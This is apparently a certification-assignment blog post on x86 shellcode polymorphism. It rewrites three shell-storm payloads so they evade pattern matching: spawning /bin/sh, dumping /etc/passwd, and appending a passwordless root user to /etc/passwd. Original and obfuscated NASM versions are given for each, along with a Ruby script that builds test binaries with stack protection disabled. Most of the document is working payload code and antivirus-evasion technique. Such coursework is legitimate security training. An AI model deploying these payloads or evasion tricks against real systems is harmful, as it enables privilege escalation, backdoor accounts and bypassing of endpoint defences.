---
title: "SLAE x86 - Assignment 0x6"
date: 2021-10-23T03:59:19Z
draft: false
tags:
  - exploit_dev
  - assembly
categories:
  - certification
keywords:
  - slae
  - shellcode
  - assembly
---

# Shellcode Polymorphism
## Objectives
- Take up 3 shellcodes from shell-storm and create polymorphic versions of them to beat pattern matching
  - The polymorphic versions cannot be larger 150% of the existing shellcode
  - Bonus points for making it shorter in length than original

## Polymorphism
It is a *"concept borrowed from a principle in biology where an organism or species can have many different forms or stages"* as mentioned in [`this Wikipedia Article`](https://en.wikipedia.org/wiki/Polymorphism_(computer_science)). It's use case in exploit development is the almost the same with [`Shellcode Encoding assignment`](../slae_x86_a4#overview) and as mentioned in the [objectives](#objectives), to beat pattern matching. In simple way, the current code is modified to be look like gibberish but still getting the end result as the original code. Also, adding extra instructions like `nops` or other that will not affect the outcome to make the shellcode look different from existing signatures of endpoint protection products.

## Tiny Execve sh Shellcode
### Original Shellcode
- Source: http://shell-storm.org/shellcode/files/shellcode-841.php
- This will use `execve` syscall to run `/bin/sh` program
```nasm
global _start

section .text

_start:
  xor ecx, ecx
  mul ecx
  mov al, 0xb
  push ecx
  push dword 0x68732f2f
  push dword 0x6e69622f
  mov ebx, esp
  int 0x80
```

### Polymorphic Version
Explanation of each lines are added as comments in the code:
```nasm
global _start

section .text

_start:
  mov ebx, 0xdcd2c45e        ; ebx =  twice the value of '/bin'
  shr ebx, 0x1               ; divide ebx by 2, once
                             ; src: https://www.felixcloutier.com/x86/sal:sar:shl:shr
  xor ecx, ecx               ; clear ecx
  push ecx                   ; push NULL
  push word 0x2f2f           ; push '//'
  mul ecx                    ; clear eax and edx
  mov al, 0xb                ; set execve
  mov word [esp+2], 0x6873   ; complete the '//sh' in esp
  push ebx                   ; push '/bin'
  mov ebx, esp               ; ebx = address of esp
  int 0x80                   ; syscall
```

### Shellcode Testing
Used the [Ruby script](#ruby-script) to make the compilation of the binary easier.

![](tiny_execve_sh.gif)

## Tiny Read File Shellcode
### Original Shellcode
- Source: http://shell-storm.org/shellcode/files/shellcode-842.php
- This will read `/etc/passwd` file, the same purpose with the shellcode in [Shellcode Analysis assignment](../slae_x86_a5#msf-read-file-shellcode)
```nasm
global _start

section .text

_start:
  xor ecx, ecx
  mul ecx
  mov al, 0x5
  push ecx
  push dword 0x64777373
  push dword 0x61702f63
  push dword 0x74652f2f
  mov ebx, esp
  int 0x80
  xchg eax, ebx
  xchg eax, ecx
  mov al, 0x3
  xor edx, edx
  mov dx, 0xfff
  inc edx
  int 0x80
  xchg eax, edx
  xor eax, eax
  mov al, 0x4
  mov bl, 0x1
  int 0x80
  xchg eax, ebx
  int 0x80
```

### Polymorphic Version
Explanation of each lines are added as comments in the code:
```nasm
global _start

section .text

_start:
                                ; clear registers
  sub ebx, ebx                  ; clear ebx
  mul ebx                       ; clear eax, and edx

  ; open('/etc//passwd', NULL)
  add eax, 0x5                  ; open(2)
  push ebx                      ; push NULL
  mov ebx, 0x64777364           ; preparing ebx for 'sswd'
  add bl, 0xF                   ; ebx = 'sswd'
  push ebx                      ; push into stack
  push ebx                      ; push again, but will be overwritten
  xor ebx, 0x5075c10            ; ebx = 'c/pa'
  mov dword [esp], ebx          ; overwrite the top of stack with ebx
  mov dword [esp-4], 0x74652f2f ; 4 bytes above stack = '//et'
  sub esp, 4                    ; adjust the stack
  mov ebx, esp                  ; ebx = current stack address
  int 0x80                      ; syscall open(2)

  ; read(fd, esp, 4095)
  mov cl, 0x3                   ; read(2)
  xchg cl, al                   ; eax = 3, ecx = fd; fd is return value from open(2)
  xchg ecx, ebx                 ; ebx = fd, ecx = <esp_address>
  mov dx, 0xfff                 ; read up to 4095 bytes
  int 0x80                      ; syscall read(2)

  ; write(fd, esp, size);
  xchg eax, edx                 ; edx = size read - return from read(2); eax = 4095
  shr ax, 0x10                  ; clear ax, 0x0fff -> 0x0000
  mov bl, al                    ; clear bl
  add al, 0x4                   ; write(2)
  inc bl                        ; stdout
  int 0x80                      ; syscall write(2)

  ; exit
  xchg eax, ebx                 ; _exit(2)
  int 0x80                      ; syscall _exit(2)
```

### Shellcode Testing
Used the [Ruby script](#ruby-script) to make the compilation of the binary easier.

![](tiny_read_file.gif)

## Add Root User Shellcode
### Original Shellcode
- Source: http://shell-storm.org/shellcode/files/shellcode-211.php
- This will add a root user in the `/etc/passwd` file without a password
```nasm
global _start

section .text

_start:
  push byte +0x5
  pop eax
  xor ecx, ecx
  push ecx
  push dword 0x64777373
  push dword 0x61702f2f
  push dword 0x6374652f
  mov ebx, esp
  mov cx, 0x401
  int 0x80
  mov ebx, eax
  push byte +0x4
  pop eax
  xor edx, edx
  push edx
  push dword 0x2f3a3a30
  push dword 0x3a303a3a
  push dword 0x74303072
  mov ecx, esp
  push byte +0xc
  pop edx
  int 0x80
  push byte +0x6
  pop eax
  int 0x80
  push byte +0x1
  pop eax
  int 0x80
```

### Polymorphic Version
Explanation of each lines are added as comments in the code:
```nasm
global _start

section .text

_start:
  ; open('/etc//passwd', O_WRONLY | O_APPEND)
  push byte 0x5                 ; open(2)
  mov eax, [esp]                ; eax = 0x5
  pop ecx                       ; ecx = 0x5
  xor ecx, 0x5                  ; clear ecx
  push ecx                      ; push NULL
  push ecx                      ; push NULL
  mov dword [esp], 0x2d3ffc2d   ; overwrite the recent null in stack
  add dword [esp], 0x37377746   ; esp value = 'sswd'
  mov ebx, dword [esp]          ; ebx = 'sswd'
  push ebx                      ; esp value = 'sswd'
  xor dword [esp], 0x5075c5c    ; esp value is now '//pa' after xor
  sub ebx, 0x1030e44            ; ebx = '/etc'
  push ebx                      ; esp value = '/etc'
  mov ebx, esp                  ; ebx = esp address
  inc cl                        ; ecx = 0x1
  mov ch, 0x4                   ; ecx = (00000001 | 00002000) = 0x401
                                ; source: /usr/include/asm-generic/fcntl.h
  int 0x80                      ; syscall open(2)

  ; write(fd, esp, size);
  xchg ebx, eax                 ; ebx = fd; eax = esp address
  xchg eax, ecx                 ; ecx = esp address; eax = 0x401
  sub ax, 0x3fd                 ; eax = 0x4; write(2)
  xor edx, edx                  ; clear edx
  push edx                      ; push NULL
  mov edx, 0x4c4e5f1f           ; prepare edx for  '0::/'
  xor edx, [esp+4]              ; edx = '0::/'
  push edx                      ; esp value  = '0::/'
  xor edx, 0x5954495a           ; edx = 'jsnv'
  mov ecx, edx                  ; ecx = 'jsnv'
  sub edx, 0x3c3e3930           ; edx = '::0:'
  push edx                      ; esp value = '::0:'
  push ecx                      ; esp value = 'jsnv'
  mov ecx, esp                  ; ecx = esp address
  push byte 0xc                 ; size = 12
  pop edx                       ; edx = size
  int 0x80                      ; syscall write(2)

  ; close
  mov al, 0x6                   ; close(2)
  int 0x80                      ; syscall close(2)

  ; exit
  xor eax, eax                 ; clear eax
  inc eax                      ; eax = 0x1
  int 0x80                     ; syscall _exit(2)
```

### Shellcode Testing
Used the [Ruby script](#ruby-script) to make the compilation of the binary easier.

![](add_root_user.gif)

## Ruby Script
The following Ruby script is used for compiling the polymorphic version of the shellcodes:

```ruby
#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'

def run
  parse_args
  compile_nasm(@original)
  compile_nasm(@poly)
  @original_shellcode = generate_shellcode(@original)
  @poly_shellcode = generate_shellcode(@poly)
  replace_shellcode
  compile_binary
  display_shellcode
rescue OptionParser::MissingArgument
  puts "\e[33mMissing argument:\e[0m"
  @parser.parse %w[--help]
rescue StandardError => e
  puts "\e[31m[-]\e[0m Encountered: \e[31m'#{e.class}' #{e}\e[0m"
  exit(1)
end

# Compile the nasm code
def compile_nasm(filename)
  `nasm -f elf32 -o #{filename}.o #{filename}.nasm`
  `ld -m elf_i386 -s -o #{filename} #{filename}.o`
end

# Generate shellcode using objdump
def generate_shellcode(filename)
  objdump = `objdump -d #{filename}`
  objdump.split("\n").map { |line| line.split("\t")[1] }
         .compact.map(&:split).join('\x').prepend('\x')
end

# Replace a value inside a file
def replace_content(filename)
  file_content = File.read(filename)
  yield(file_content)
  File.write(filename, file_content)
end

# Replace shellcode in the shellcode tester program
def replace_shellcode
  replace_content('./shellcode.c') do |c_code|
    c_code.gsub!(/\"\S+\"\;/, "\"#{@poly_shellcode}\"\;")
  end
end

# Compile the shellcode into binary with the help of the shellcode.c program
def compile_binary
  `gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2> /dev/null`
end

# print the shellcode values
def display_shellcode
  original_size = @original_shellcode.split('\\').size - 1
  poly_size = @poly_shellcode.split('\\').size - 1
  percentage = ((100.0 * poly_size / original_size) - 100).round(2)
  puts "Original shellcode    [#{original_size} bytes]: '#{@original_shellcode}'"
  puts "Polymorphic shellcode [#{poly_size} bytes]: '#{@poly_shellcode}'"
  puts "\nPercentage larger than the original: #{percentage} %"
end

def parse_args
  @parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    opts.separator ""
    opts.separator "Options:"

    opts.on("--original", "-o ORIG_NASM", "Original nasm filename") do |value|
      @original = value
    end

    opts.on("--poly", "-p POLY_NASM", "Polymorphic nasm filename") do |value|
      @poly = value
    end

    opts.on_tail("--help", "-h", "Print options") do |show_help|
      warn opts
      exit(0)
    end
  end
  @parser.parse!
end

if __FILE__ == $PROGRAM_NAME
  run
  puts "\n\e[32m[+]\e[0m Successfully generated \e[32mshellcode\e[0m "\
       "binary for testing!"
end
```

### Script Usage
![](Pasted%20image%2020211023130316.png)

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 1558

---
[`Link to Github repository`](https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A6) | [`Link to index page`](../slae_x86)
